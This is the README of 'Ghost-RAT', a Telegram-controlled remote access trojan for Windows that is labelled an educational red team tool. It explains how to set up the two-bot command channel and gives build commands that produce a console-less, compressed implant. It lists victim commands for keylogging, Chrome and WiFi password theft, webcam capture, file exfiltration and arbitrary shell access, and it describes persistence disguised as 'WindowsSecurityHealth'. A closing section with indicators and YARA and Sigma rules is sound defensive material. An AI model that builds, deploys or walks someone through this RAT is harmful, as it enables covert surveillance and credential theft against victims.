# 👻 Ghost-RAT v1.1

### Advanced Telegram C2 Remote Access Tool — Educational Red Team Project

---

> ⚠️ **LEGAL DISCLAIMER & ETHICAL WARNING**
>
> Ghost-RAT is **STRICTLY** for:
> - **SOC (Security Operations Center) testing** and analysis
> - **Red team lab exercises** in isolated environments
> - **Malware behavior research** and detection technique development
> - **Cybersecurity education** and training
>
> **You MUST only use this on systems you own or have explicit written permission to test.**
> Unauthorized access to computer systems is **illegal** under laws including the Computer Fraud and Abuse Act (CFAA), IT Act 2000, and equivalent legislation worldwide.
>
> **The authors take no responsibility for misuse of this tool.**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Two-Bot Architecture](#two-bot-architecture)
- [Features](#features)
- [File Structure](#file-structure)
- [Setup Guide](#setup-guide)
- [Building the Implant](#building-the-implant)
- [Usage Guide](#usage-guide)
- [Command Reference](#command-reference)
- [Detection & Analysis](#detection--analysis)
- [Troubleshooting](#troubleshooting)

---

## 🔍 Overview

Ghost-RAT is a lightweight, multi-victim Remote Access Trojan that uses **Telegram** as its Command & Control (C2) channel. It demonstrates how real-world RATs operate for defensive security research:

- **Implant** → Runs on Windows victim machines (compiled to `.exe`)
- **C2 Server** → Runs on the attacker's Linux machine
- **Communication** → All traffic flows through a Telegram Bot in a private group
- **Persistence** → Registry Run key + Scheduled Task + Startup Folder
- **Multi-victim** → Unique victim IDs allow targeting individual or all victims

---

## 🏗️ Two-Bot Architecture

Ghost-RAT uses **two separate Telegram bots** to avoid a critical Telegram API limitation:

> **Why two bots?** Telegram's `getUpdates` API only allows **one consumer per bot**. If both the implant and C2 server poll with the same bot token, they steal each other's messages. Using separate bots solves this cleanly.

```
┌──────────────────────┐                              ┌──────────────────────┐
│   VICTIM (Windows)   │                              │   ATTACKER (Linux)   │
│                      │    ┌──────────────────────┐  │                      │
│  Ghost-RAT.exe       │    │   Private Telegram   │  │  c2_server.py        │
│  Uses: BOT_TOKEN     │───►│       Group          │◄─│  Uses: C2_BOT_TOKEN  │
│  (Implant Bot)       │    │                      │  │  (Observer Bot)      │
│  - Polls getUpdates  │    │  Both bots are       │  │  - Polls getUpdates  │
│  - Sends results     │    │  members of this     │  │  - Reads check-ins   │
│  - Executes commands │    │  group               │  │  - Logs activity     │
│                      │    └──────────────────────┘  │  - SQLite tracking   │
└──────────────────────┘                              └──────────────────────┘
```

**Flow:**
1. Implant starts → generates unique victim ID → installs persistence
2. Implant sends check-in message via **Implant Bot** (BOT_TOKEN)
3. C2 server reads check-in via **Observer Bot** (C2_BOT_TOKEN) → registers victim in SQLite
4. Operator types command in group: `GHOST-XXXXXXXX /sysinfo`
5. Implant polls via Implant Bot, finds command, executes, sends result
6. C2 server reads result via Observer Bot → logs to database

---

## ✨ Features

### Core
| Feature | Description |
|---------|-------------|
| Unique Victim ID | SHA-256 hash of hostname + MAC + username + disk serial → `GHOST-XXXXXXXX` |
| Persistence | Registry Run Key + Scheduled Task + Startup Folder (3 methods) |
| Jitter | 30-60 second randomized check-in intervals |
| Multi-victim | Target specific victims or broadcast to all |
| Mutex | Prevents duplicate instances from running |
| Retry Logic | Check-in retries with exponential backoff |
| Heartbeat | Periodic re-check-in to keep last_seen timestamp fresh |

### Implant Commands
| Command | Description |
|---------|-------------|
| `/sysinfo` | OS, hostname, IP, user, architecture |
| `/screenshot` | Capture full screen |
| `/webcam` | Webcam snapshot |
| `/shell <cmd>` | Execute any shell command |
| `/cd <path>` | Change directory |
| `/ls [path]` | List directory contents |
| `/upload <path>` | Exfiltrate file from victim |
| `/download <url> <path>` | Download file to victim |
| `/clipboard` | Dump clipboard contents |
| `/wifi` | Extract saved WiFi passwords |
| `/keylog [seconds]` | Record keystrokes (default 30s) |
| `/search <pattern>` | Search for files (glob pattern) |
| `/browsers` | Chrome saved passwords (DPAPI + AES-GCM) |
| `/proclist` | List running processes |
| `/prockill <pid>` | Kill a process |
| `/shutdown` | Shutdown victim machine |
| `/restart` | Restart victim machine |
| `/selfdestruct` | Remove persistence + delete implant |
| `/help` | Show command reference |

### C2 Server Commands
| Command | Description |
|---------|-------------|
| `/victims` | List all registered victims |
| `/remove <id>` | Remove a victim from the database |
| `/help` | Show command reference |

---

## 📁 File Structure

```
ghost-rat/
├── implant.py              # Main Windows implant payload
├── c2_server.py            # Linux C2 server (Observer bot)
├── config.py               # Configuration (both bot tokens, group ID, settings)
├── requirements.txt        # Python dependencies
├── README.md               # This file
├── utils/
│   ├── __init__.py
│   ├── victim_id.py        # Unique victim ID generation & caching
│   └── persistence.py      # Registry + Scheduled Task + Startup Folder
├── commands/
│   ├── __init__.py
│   └── handler.py          # Command dispatcher (20 commands)
└── dist/
    └── Ghost-RAT.exe       # Compiled implant (after build)
```

---

## 🛠️ Setup Guide

### Prerequisites
- **Python 3.9+** on both machines
- A **Telegram account**
- **Windows VM** (victim — isolated, no internet access to real targets)
- **Linux machine** (attacker — or WSL)

### Step 1: Create the Implant Bot

1. Open Telegram and message **@BotFather**
2. Send `/newbot` → name it something like `GhostImplantBot`
3. Copy the **Bot Token** → this is your `BOT_TOKEN`

### Step 2: Create the Observer Bot (C2)

1. Message **@BotFather** again
2. Send `/newbot` → name it something like `GhostC2Bot`
3. Copy the **Bot Token** → this is your `C2_BOT_TOKEN`

### Step 3: Create a Private Telegram Group

1. Create a new group in Telegram
2. **Add BOTH bots** to the group
3. Send any message in the group
4. Visit `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates` in a browser
5. Find the `"chat": {"id": -100XXXXXXXXXX}` — this is your **GROUP_CHAT_ID**

### Step 4: Configure Ghost-RAT

Edit `config.py`:

```python
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ"         # Implant bot
C2_BOT_TOKEN = "0987654321:ZYXwvuTSRqpONMlkjIHGfedCBA"      # Observer bot
GROUP_CHAT_ID = "-100XXXXXXXXXX"
```

### Step 5: Install Dependencies

```bash
# On BOTH machines (or just the build machine):
pip install -r requirements.txt
```

---

## 🔨 Building the Implant

### Compile to a single Windows .exe:

```bash
pyinstaller --onefile --noconsole --name Ghost-RAT \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

**Flags explained:**
- `--onefile` → Single standalone .exe (no extra files needed)
- `--noconsole` → No command prompt window appears when running
- `--name Ghost-RAT` → Output filename
- `--hidden-import` → Required for pynput keylogger to work in compiled .exe

The compiled `.exe` will be in the `dist/` folder:
```
dist/Ghost-RAT.exe
```

### Optional: Add a custom icon
```bash
pyinstaller --onefile --noconsole --name Ghost-RAT --icon=myicon.ico \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

### Optional: UPX compression (smaller .exe)
```bash
# Install UPX first, then:
pyinstaller --onefile --noconsole --name Ghost-RAT --upx-dir=/path/to/upx \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

---

## 🚀 Usage Guide

### 1. Start the C2 Server (Attacker — Linux)

```bash
python3 c2_server.py
```

You should see:
```
    ╔═══════════════════════════════════════════╗
    ║           👻 GHOST-RAT C2 SERVER          ║
    ║       Educational Red Team Tool v1.1      ║
    ╚═══════════════════════════════════════════╝

2024-01-01 12:00:00 [INFO] Database initialized: victims.db
2024-01-01 12:00:00 [INFO] Using OBSERVER bot token (C2_BOT_TOKEN) — no conflict with implant polling
2024-01-01 12:00:00 [INFO] ✅ C2 server is ONLINE. Waiting for victims...
```

### 2. Deploy the Implant (Victim — Windows VM)

Copy `dist/Ghost-RAT.exe` to the Windows VM and run it. The implant will:
1. Check for existing instances (mutex)
2. Generate a unique victim ID
3. Install persistence (3 methods)
4. Send a check-in message to the Telegram group (with retry)
5. Begin polling for commands

### 3. Send Commands (Telegram Group)

In the Telegram group, send commands using the format:

```
GHOST-A1B2C3D4 /sysinfo
```

Or broadcast to ALL victims:
```
@all /screenshot
```

### 4. View Registered Victims

In the Telegram group:
```
/victims
```

### 5. Remove a Victim

```
/remove GHOST-A1B2C3D4
```

---

## 🔬 Detection & Analysis (Blue Team)

This section helps SOC analysts and blue teamers understand what to look for:

### Network Indicators
- **Telegram API traffic**: HTTPS connections to `api.telegram.org`
- **Periodic beaconing**: Regular HTTP(S) requests every 30-60 seconds with slight jitter
- **File uploads**: Large POST requests to Telegram's file upload endpoint
- **Two distinct bot tokens**: Watch for traffic to two different bot endpoints

### Host Indicators
- **Registry**: Check `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for `WindowsSecurityHealth`
- **Scheduled Tasks**: Look for task named `WindowsSecurityHealth` in Task Scheduler
- **Startup Folder**: Check `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` for unexpected `.exe` files
- **Processes**: Look for unsigned executables with network connections to `api.telegram.org`
- **File System**: Hidden `.ghost_id` file in `%APPDATA%`
- **Mutex**: Named mutex `Global\GhostRAT_WindowsSecurityHealth`

### YARA Rule (Example)
```yara
rule Ghost_RAT {
    meta:
        description = "Detects Ghost-RAT implant"
        author = "SOC Team"
        severity = "high"
    strings:
        $s1 = "GHOST-RAT CHECK-IN" ascii
        $s2 = "ghost_id" ascii
        $s3 = "WindowsSecurityHealth" ascii
        $s4 = "api.telegram.org" ascii
        $s5 = "GhostRAT_" ascii
    condition:
        3 of ($s*)
}
```

### Sigma Rule (Example)
```yaml
title: Ghost-RAT Persistence Detection
status: experimental
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains: 'WindowsSecurityHealth'
        EventType: SetValue
    condition: selection
level: high
```

### Sigma Rule — Mutex Detection
```yaml
title: Ghost-RAT Mutex Detection
status: experimental
logsource:
    category: create_mutex
    product: windows
detection:
    selection:
        MutexName|contains: 'GhostRAT_'
    condition: selection
level: critical
```

---

## 🔧 Troubleshooting

### "BOT_TOKEN not configured!"
→ Edit `config.py` and set your Telegram Implant bot token.

### "C2_BOT_TOKEN not configured!"
→ Create a second bot via @BotFather for the C2 observer. Set it in `config.py`.

### "GROUP_CHAT_ID not configured!"
→ Follow Step 3 in Setup to find your group's chat ID.

### Implant doesn't check in
1. Verify **both bots** are in the group
2. Check internet connectivity on the Windows VM
3. Run `implant.py` directly (not as `.exe`) to see error messages
4. Ensure the bots have permission to read/send messages in the group
5. Check that `BOT_TOKEN` (not `C2_BOT_TOKEN`) is set correctly for the implant

### PyInstaller build fails
```bash
# Try upgrading PyInstaller:
pip install --upgrade pyinstaller

# Full build command with all hidden imports:
pyinstaller --onefile --noconsole \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  --name Ghost-RAT implant.py
```

### Commands not executing
- Make sure you're using the correct victim ID format: `GHOST-XXXXXXXX`
- The implant only processes messages from the configured group
- Check that the command format matches exactly (e.g., `/shell whoami`, not `shell whoami`)
- Remember: commands go through the **Implant Bot**, management through the **C2 Bot**

### C2 server not seeing check-ins
- Make sure the **Observer Bot** (C2_BOT_TOKEN) is added to the group
- The C2 server uses a **different bot** than the implant — this is by design
- Both bots must be members of the same private group

---

## 📜 License

This project is provided for **educational purposes only**. No warranty is provided. Use responsibly and legally.

---

*Built for cybersecurity education and defensive research. v1.1*
